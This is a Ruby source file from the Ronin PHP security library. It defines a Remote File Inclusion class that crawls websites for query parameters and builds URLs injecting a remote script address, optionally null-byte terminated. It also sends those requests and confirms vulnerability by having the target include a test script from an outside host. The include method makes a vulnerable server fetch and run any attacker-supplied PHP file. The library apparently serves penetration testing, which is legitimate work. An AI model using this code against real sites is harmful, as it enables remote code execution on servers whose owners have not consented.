#
#--
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2008 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#++
#

require 'ronin/network/http'
require 'ronin/extensions/uri'
require 'ronin/formatting/digest'
require 'ronin/chars'

module Ronin
  module PHP
    class RFI

      # Default URL of the RFI Test script
      TEST_SCRIPT = 'http://ronin.rubyforge.org/dist/php/rfi/test.php'

      # Prefix text that will appear before the random RFI challenge string
      CHALLENGE_PREFIX = 'PHP RFI Response: '

      # RFI vulnerable url
      attr_reader :url

      # RFI vulnerable query parameter 
      attr_reader :param

      # Whether to terminate the RFI script url with a null byte
      attr_accessor :terminate

      # URL of the RFI Test script
      attr_accessor :test_script

      #
      # Creates a new RFI object with the specified _url_, _param_ and given
      # _options_.
      #
      # _options may contain the following keys:
      # <tt>:terminate</tt>:: Whether or not to terminate the RFI script url
      #                       with a null byte. Defaults to +true+.
      # <tt>:test_script</tt>:: URL of RFI test script. Defaults to
      #                         TEST_SCRIPT.
      #
      def initialize(url,param,options={})
        @url = url
        @param = param

        if options.has_key?(:terminate)
          @terminate = options[:terminate]
        else
          @terminate = true
        end

        @test_script = (options[:test_script] || TEST_SCRIPT)
      end

      def RFI.spider(url,options={},&block)
        rfis = []

        Web.spider_site(url,options) do |spider|
          spider.every_url_like(/\?[a-zA-Z0-9_]/) do |vuln_url|
            found = vuln_url.test_rfi

            found.each(&block) if block
            rfis += found
          end
        end

        return rfis
      end

      #
      # Returns +true+ if the RFI script url will be terminated with
      # a null byte, returns +false+ otherwise.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a RFI url to include the specified _script_url_.
      #
      def url_for(script_url)
        script_url = URI(script_url.to_s)
        new_url = URI(@url.to_s)

        new_url.query_params.merge!(script_url.query_params)
        script_url.query_params.clear

        script_url = "#{script_url}?" if terminate?

        new_url.query_params[@param.to_s] = script_url
        return new_url
      end

      #
      # Include the specified RFI _script_ using the given _options_.
      #
      def include(script,options={})
        options = options.merge(:url => url_for(script))

        if options[:method] == :post
          return Net.http_post_body(options)
        else
          return Net.http_get_body(options)
        end
      end

      #
      # Returns +true+ if the url is vulnerable to RFI, returns +false+
      # otherwise.
      #
      def vulnerable?(options={})
        challenge = Chars.alpha_numeric.random_string(10).md5

        test_url = URI(@test_script.to_s)
        test_url.query_params['rfi_challenge'] = challenge

        response = include(test_url,options)
        return response.include?("#{CHALLENGE_PREFIX}#{challenge}")
      end

    end
  end
end
